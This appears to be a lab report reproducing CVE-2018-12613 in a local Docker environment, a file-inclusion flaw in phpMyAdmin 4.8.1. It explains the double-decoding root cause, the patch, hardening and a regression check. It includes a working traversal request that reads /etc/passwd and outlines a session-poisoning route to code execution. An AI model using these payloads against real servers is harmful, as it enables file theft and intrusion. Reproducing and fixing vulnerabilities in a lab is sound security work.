# Work 1 — CVE reproduction, root cause and fix

Target: **CVE-2018-12613** — local file inclusion in phpMyAdmin 4.8.1
(PMASA-2018-4; fixed in 4.8.2; affects 4.8.0 and 4.8.1).

## 1. Vulnerable environment

`docker-compose.yml` starts the public Vulhub environment: `vulhub/phpmyadmin:4.8.1`
plus `mysql:5.5`, with `config.inc.php` in `config` auth mode so the page needs no manual login.

```bash
docker compose up -d          # phpMyAdmin 4.8.1 on http://127.0.0.1:8080
docker compose ps
curl -s http://127.0.0.1:8080/ | grep -o '<title>[^<]*'
```

## 2. Reproduction

```bash
curl --path-as-is -s \
  "http://127.0.0.1:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
```

Expected on the vulnerable build: the response embeds the contents of `/etc/passwd`
(`root:x:0:0:root:/root:/bin/bash` …) inside the page — arbitrary file read.
Captured evidence is in `evidence/`.

## 3. Root cause

`index.php` includes a file chosen by the `target` request parameter:

```php
if (! empty($_REQUEST['target']) && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])) {
    include $_REQUEST['target'];
    exit;
}
```

`Core::checkPageValidity()` validates the parameter against a whitelist of pages
(`db_sql.php`, `sql.php`, …) and **decodes the value a second time** while doing so.
That double decoding is the flaw:

1. the request carries `db_sql.php%253f/../../../../etc/passwd`;
2. the first URL decode turns `%253f` into `%3f`, so the whitelist check only sees
   `db_sql.php` and passes;
3. `include` then resolves the full string, where `%3f` is a `?` and the `../` segments
   climb out of the phpMyAdmin directory.

In short: **the value that is validated is not the value that is used** — a canonicalisation
bug of the same family as CVE-2021-41773 (decode/validate order), just in PHP instead of C.

## 4. Impact and escalation

Reading arbitrary files already leaks configuration (`config.inc.php` holds database
credentials) and system data. The public write-ups escalate it to code execution by writing
PHP into the session file (`SELECT '<?=phpinfo()?>'` stores the query in the session) and then
including `/var/lib/php/sessions/sess_<PHPSESSID>`. In this container `access.log` is a symlink
to `/dev/stdout`, so the classic log-poisoning variant is not available; the session variant was
therefore documented but not executed here — the file read is enough to prove the vulnerability.

## 5. Fix

| Layer | Change | Why it works |
|---|---|---|
| Patch | upgrade to **4.8.2** (the branch fix, PMASA-2018-4); this lab uses **5.2.2**, which contains the same fix and is still maintained | `target` is validated after a single decode and restricted to real pages, so `db_sql.php%253f/../…` can no longer pass the whitelist |
| Hardening | `open_basedir` limited to the web root, `allow_url_include=Off`, least-privilege DB account | even with a future include bug, PHP cannot read outside the web root or fetch remote files |

```bash
docker build -f fixed/Dockerfile -t hdu-is/cve-2018-12613:fixed .
docker run -d --name cve-fixed --network cve-net -p 8081:80 hdu-is/cve-2018-12613:fixed
```

## 6. Verification and regression

```bash
bash poc.sh http://127.0.0.1:8080   # exit 1: vulnerable, /etc/passwd disclosed
bash poc.sh http://127.0.0.1:8081   # exit 0: blocked, no file content
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/   # 200, login page still served
```

## 7. Results of this run (2026-10-20)

| Step | Vulnerable phpMyAdmin 4.8.1 | Fixed phpMyAdmin 5.2.2 |
|---|---|---|
| `GET /index.php?target=db_sql.php%253f/…/etc/passwd` | **HTTP 200**, page embeds `root:x:0:0:root:/root:/bin/bash` and the rest of `/etc/passwd` | HTTP 200, phpMyAdmin page only — no file content |
| `GET /` (regression) | 200, phpMyAdmin UI | 200, phpMyAdmin login page |

Reproduce locally:

```bash
docker network create cve-net
docker run -d --name mysql --network cve-net \
  -e MYSQL_RANDOM_ROOT_PASSWORD=yes -e MYSQL_DATABASE=test \
  -e MYSQL_USER=test -e MYSQL_PASSWORD=test mysql:5.5
docker build -t hdu-is/cve-2018-12613:4.8.1 .
docker run -d --name cve-vuln --network cve-net -p 8080:80 hdu-is/cve-2018-12613:4.8.1
```

Note: the containers were run on a VirtualBox/boot2docker VM, so the host addresses above were
`192.168.99.100:8080` / `:8081`; `poc.sh` takes the base URL as its first argument.

## 8. Evidence checklist

- [x] vulnerable request + `/etc/passwd` in the response → `evidence/01-vulnerable-lfi.txt`
- [x] excerpt of the disclosed file → `evidence/02-vulnerable-passwd.txt`
- [x] same request against the fixed build → `evidence/03-fixed-lfi.txt`
- [x] regression (UI still served) → `evidence/04-regression.txt`
